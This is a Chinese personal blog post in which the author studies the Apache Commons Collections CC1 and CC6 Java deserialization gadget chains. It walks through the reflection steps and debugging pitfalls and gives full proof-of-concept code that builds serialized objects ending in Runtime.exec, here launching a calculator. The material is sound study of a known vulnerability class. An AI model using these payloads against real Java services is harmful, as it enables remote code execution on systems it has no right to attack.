<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="java-cc1、cc6"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>java-cc1、cc6 | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">260</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">java-cc1、cc6</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-01-03</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>#环境搭建<br>openjdk 8u65相关源码下载<br><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a><br>这里经常会下到一半断掉，所以可以直接下载sun文件里面的内容，也是直接点zip下载就行<br>openjdk 8u65下载<br><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>#调试cc1<br>##命令执行方式<br>###一般命令执行方式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>###利用反射调用执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">Class c=Runtime.class;</span><br><span class="line">Method execMethod = c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>###transform执行命令（最终命令执行处）<br>但是此时没办法反序列化，因为Runtime类没有继承序列化接口，所以我们就需要寻找可以实现反射的途径，这里就可以看到<img src="/.com//2022-11-03-18-57-11.png"><br>相当于是实现了一个反射方法，而这个transform方法是属于InvokerTransformer这个方法的，而InvokerTransformer是有继承序列化接口，所以就用这个类来构造一下命令执行姿势</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    Method getRuntimeMethod = (Method) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">    Runtime r= (Runtime) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而这样写又写麻烦，可以使用ChainedTransform直接链式调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>
<ul>
<li>首先这里的InvokerTransformer传入的参数格式为，第一个是方法名，第二个是方法名的数据类型，第三个是参数。</li>
</ul>
<p>##构造链条<br>要构造链条，首先需要找一下哪里调用了transform,在这些map里面均有调用transform<br><img src="/.com//2022-11-07-21-22-22.png"><br>以checksetvalue为函数，再找一下哪里调用了这个checksetvalue<br><img src="/.com//2022-11-07-21-47-24.png"><br>接下来需要看看checksetvalue里面的，可以看到这个checksetvalue是对valuetransformer进行transform进行赋值操作，所以我们需要看看构造函数对如何对这个valuetransformer进行赋值，然后从这里传入，可以看到这里是这个类的一个构造函数<br><img src="/.com//2022-11-09-18-16-34.png"><br>接下来就看看哪里有调用这个checksetvalue，然后在进行探索可以发现，是在setvalue这边使用，接下来就看看哪里调用了这个setvalue<br><img src="/.com//2022-11-09-18-22-24.png"><br>可以看到，在AnnotationInvocationHandler中的readObject直接使用了这个setValue，然后接下来我们只需关注memberValue如何传入即可<br><img src="/.com//2022-11-09-20-03-29.png"><br>可以看到，传入的类型为map类型就行<br><img src="/.com//2022-11-09-20-07-12.png"><br>那我们接下来就捋一下调用链：<br>InvocationHandler().transformer<br>-&gt;TransformedMap.transformer<br>    -&gt;AbstractMapEntryDecorator.setValue<br>        -&gt;AnnotationInvocationHandler.readObject<br>poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">        Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="comment">//        Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap =TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; b= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationhdlconstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = annotationInvocationhdlconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>链子写完以后，在调试过程中也是有遇到一些坑点的，这里就来梳理一下</p>
<ul>
<li>AnnotationInvocationHandler中要到我们需要的setvalue部分是存在一个判断，这个的意思是，map.put第一个参数值(“value”)要被作为name，然后去看看Target.class的构造函数中有没有这个value参数名，有的话才能进到判断里面去<br><img src="/.com//2022-11-10-15-28-37.png"><br>所以这里map.put的值需要取的是value，因为Target.class中是有这个参数名的<br><img src="/.com//2022-11-10-15-31-56.png"></li>
<li>过了上面的这个判断以后，在debug过程中，可以看到链子的这个object的值不是我们需要的Rumtime.class，而是变成了另外一个值，所以，这里需要对他进行改写，因此可以利用<code>ConstantTransformer</code><br><img src="/.com//2022-11-10-15-33-51.png"><br><code>ConstantTransformer</code>的作用是，输入什么就固定输出什么，我们一开始在这里输入Rume.class，他在后面的返回值当中就会输出这个内容：<br><img src="/.com//2022-11-10-15-35-29.png"><br>可以看到，此时已经被改写为Runtime.class了<br><img src="/.com//2022-11-10-15-36-10.png"><br>到这里整条链子的分析就结束了，成功执行命令<br><img src="/.com//2022-11-10-15-37-45.png"></li>
</ul>
<p>###lazymap版CC1<br>这里还有另外一种触发方式，就是利用lazymap<br><img src="/.com//2022-11-24-16-22-38.png"><br>可以发现有很多地方都使用了get，这里直接看一下是从哪里进来的，根据网上有的链子，发现还是在annotationinvocationhandler中调用了这个get，接下来就看看如何触发这个invoke<br><img src="/.com//2022-11-24-16-25-09.png"><br>invoke 主要是用来调用某个类中的方法的，但是他不是通过当前类直接去调用而是通过反射的机制去调用。所以这里我们直接调用annotationinvocationhandler的某个方法就行，那么接下来就要看看哪里可以调用这个方法，并且最好在readObject里面，这里需要再看一下进入到invoke里面的判断，主要就是要无参方法的方法才能进入到最后的，大概分析一下：<br>1.通过method.getParameterTypes()获取方法各参数的Class对象组成的数组<br>2.可以发现两个判断要绕过的条件就是无参即可<br><img src="/.com//2022-11-24-17-08-12.png"><br>可以发现annotaionhandler的readObject中就存在这个方法了：也就是<br><img src="/.com//2022-11-25-14-36-42.png"><br>但是要劫持一个对象内部方法的调用实现类似php的__call方法，需要使用java中的动态代理才能实现即<br><code>java.reflect.Proxy</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>
<p>在Proxy.newProxyInstance的第一个参数是ClassLoader<br>，使用默认的即可，第二个为所需要代理的对象的集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代码的逻辑<br>最后构造出来的下面部分长这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map Lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; b= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationhdlconstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">InvocationHandler handler = (InvocationHandler) annotationInvocationhdlconstructor.newInstance(Override.class,Lazymap);</span><br><span class="line"></span><br><span class="line">Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object o = annotationInvocationhdlconstructor.newInstance(Override.class,mapProxy);</span><br></pre></td></tr></table></figure>
<p>###CC6<br>前面说的cc1是需要看jdk版本，过高的话，前面两条链子就无法使用了，而cc6就比较无视版本了<br>首先来看看他的gadget</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashMap.readObject()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
<p>可以发现后面的部分还是一样，使用的是LazyMap，而前面的部分使用了一个TiedMapEntry,重点来观察一下这个TiedMapEntry<br>里面的getvalue调用了get函数，那么接下来就看看哪里调用了getvalue就可以了<br><img src="/.com//2022-11-25-20-00-52.png"><br>可以发现，在hashcode中就调用了这个getvalue了<br><img src="/.com//2022-11-25-20-02-21.png"><br>而在java.util.HashMap.hash()中调用了这个hashcode，然后在继续在hashmap中的readObject中使用这个hash，所以直接对其进行序列化和反序列化就行了<br>####错误的尝试<br><img src="/.com//2022-11-25-21-33-21.png"><br>这里直接序列化map2的话是没有结果的，因为此时在put值的时候，put方法里面就有一个hash<br><img src="/.com//2022-11-25-21-37-45.png"><br>那么就会将上面原本链条的内容走完了，所以这里需要将原本的chainedTransformer弄一个假的放进去，然后后面再通过反射重新传入值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class b&#x3D;LazyMap.class;</span><br><span class="line">Field lazyfield&#x3D;b.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">lazyfield.setAccessible(true);</span><br><span class="line">lazyfield.set(Lazymap,chainedTransformer);</span><br></pre></td></tr></table></figure>
<p>但是此时，也无法实现命令执行，因为此时的key已经被赋值了<br><img src="/.com//2022-11-25-22-14-11.png"><br>但是原本是没有的，也是同样在前面的put过程中被赋值的，这个时候我们就直接将这个key删掉就行了<br><img src="/.com//2022-11-25-22-17-55.png"><br>然后就可以成功命令执行了<br>完整的paylaod如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">        Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="comment">//        Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map Lazymap = LazyMap.decorate(map,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(Lazymap,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Lazymap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class b=LazyMap.class;</span><br><span class="line">        Field lazyfield=b.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        lazyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        lazyfield.set(Lazymap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>##总结<br>这次学了java的两条链，从反射等基础知识开始，到手写调用链，确实收获了很多，有几点回忆总结一下<br>1.印象比较深刻的是cc6也就是和urldns一样的地方，这里需要反射来更改值，不然之前的已经被put执行过一次了，就不会再重新走了<br>2.使用proxy动态代理的问题，如果是要调用一个内部对象的方法，那么就需要动态代理</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/01/03/javacc1/">http://example.com/2023/01/03/javacc1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/01/08/edictf/"><i class="fa fa-chevron-left">  </i><span>EDI内部ctf</span></a></div><div class="next-post pull-right"><a href="/2022/12/26/mac%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%90%88%E9%9B%86/"><span>mca环境配置问题</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>